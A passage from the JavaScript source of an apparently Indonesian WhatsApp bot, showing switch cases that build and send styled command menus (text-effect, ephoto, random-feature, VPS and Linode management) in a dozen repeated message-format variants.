                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'textpro': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *T E X T P R O - M E N U*
${simboltengah}
${global.tTeks}aovwall *text*
${global.tTeks}anonymhacker *text*
${global.tTeks}advanceglow *text*
${global.tTeks}avatarlolnew *text*
${global.tTeks}avatardota *text*
${global.tTeks}avenger *text*
${global.tTeks}bloodfrosted *text*
${global.tTeks}bokeh *text*
${global.tTeks}box3d *text*
${global.tTeks}breakwall *text*
${global.tTeks}cartoongravity *text*
${global.tTeks}cloud *text*
${global.tTeks}deluxesilver *text*
${global.tTeks}fireworksparkle *text*
${global.tTeks}futureneon *text*
${global.tTeks}fpslogo *text*
${global.tTeks}greenneon *text*
${global.tTeks}holographic *text*
${global.tTeks}horrorblood *text*
${global.tTeks}icecold *text*
${global.tTeks}jokerlogo *text*
${global.tTeks}lionlogo *text*
${global.tTeks}lighttext *text*
${global.tTeks}lolbanner *text*
${global.tTeks}logogaming *text*
${global.tTeks}luxury *text*
${global.tTeks}marvelstudio *text*
${global.tTeks}metaldark *text*
${global.tTeks}minion *text*
${global.tTeks}natureleaves *text*
${global.tTeks}neon *text*
${global.tTeks}neonlight *text*
${global.tTeks}newyearcard *text*
${global.tTeks}ninjalogo *text*
${global.tTeks}pubgmaskot *text*
${global.tTeks}pornhubmaker *text*
${global.tTeks}roadwarning *text*
${global.tTeks}sandengraved *text*
${global.tTeks}sandsummer *text*
${global.tTeks}sandwriting *text*
${global.tTeks}space *text*
${global.tTeks}starsnight *text*
${global.tTeks}strawberries *text*
${global.tTeks}steel3d *text*
${global.tTeks}summersand *text*
${global.tTeks}text1917 *text*
${global.tTeks}thunder *text*
${global.tTeks}toxic *text*
${global.tTeks}wooden3d *text*
${global.tTeks}wolflogo *text*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'ephotomenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *E P H O T O - M E N U*
${simboltengah}
${global.tTeks}glitchtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}writetext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}advancedglow *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}typographytext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pixelglitch *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}neonglitch *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}flagtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}flag3dtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}deletingtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}blackpinkstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}glowingtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}underwatertext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}logomaker *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cartoonstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}papercutstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}watercolortext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}effectclouds *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}blackpinklogo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}gradienttext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}summerbeach *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}luxurygold *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}multicoloredneon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}sandsummer *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}galaxywallpaper *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}1917style *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}makingneon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}royaltext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}freecreate *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}galaxystyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}lighteffects *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'randommenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *R A N D O M - M E N U*
${simboltengah}
${global.tTeks}afk *text*
${global.tTeks}attp *text*
${global.tTeks}apakah *text*
${global.tTeks}bisakah *text*
${global.tTeks}bagaimanakah *text*
${global.tTeks}besarkecil *text*
${global.tTeks}bucin
${global.tTeks}cuaca *kota*
${global.tTeks}ceritahoror
${global.tTeks}cerpen
${global.tTeks}define *text*
${global.tTeks}emojimix *emoji*
${global.tTeks}emojimix2 *emoji*
${global.tTeks}foliokanan *text*
${global.tTeks}foliokiri *text*
${global.tTeks}faktaunik
${global.tTeks}infogempa
${global.tTeks}infocuaca *kota*
${global.tTeks}jarak *query*
${global.tTeks}kapankah *text*
${global.tTeks}katabijak
${global.tTeks}kbbi *text*
${global.tTeks}kodepos *text*
${global.tTeks}makermeme *text*
${global.tTeks}menfes *text*
${global.tTeks}nulis *text*
${global.tTeks}nuliskanan *text*
${global.tTeks}nuliskiri *text*
${global.tTeks}puisi
${global.tTeks}pantun
${global.tTeks}poll *text*
${global.tTeks}quotes 
${global.tTeks}randomnama
${global.tTeks}storywa *text*
${global.tTeks}translate *text*
${global.tTeks}tsunami
${global.tTeks}ttp *text*
${global.tTeks}wm *reply sticker*
${global.tTeks}wmvideo *reply vid*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'vpsmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼

${readmore}
${simbolatas}
${simbol0} *V P S - M E N U*
${simboltengah}
${global.tTeks}deldroplet
${global.tTeks}svps / sendvps
${global.tTeks}listdroplet
${global.tTeks}cekdroplet
${global.tTeks}turnoff
${global.tTeks}turnon
${global.tTeks}sisadroplet
${global.tTeks}rebuild
${global.tTeks}restartvps
${global.tTeks}vps1g1c
${global.tTeks}vps2g1c
${global.tTeks}vps4g2c
${global.tTeks}vps8g4c
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'linodemenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *L I N O D E - M E N U*
${simboltengah}
${global.tTeks}resetpassword
${global.tTeks}deletelinode
${global.tTeks}listlinode
${global.tTeks}onlinode
${global.tTeks}offlinode
${global.tTeks}rebootlinode
${global.tTeks}rebuildlinode
${global.tTeks}sisalinode
${global.tTeks}saldolinode
${global.tTeks}cekvpslinode
${global.tTeks}linode2gb
${global.tTeks}linode4gb
${global.tTeks}linode8gb
${global.tTeks}linode16gb
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
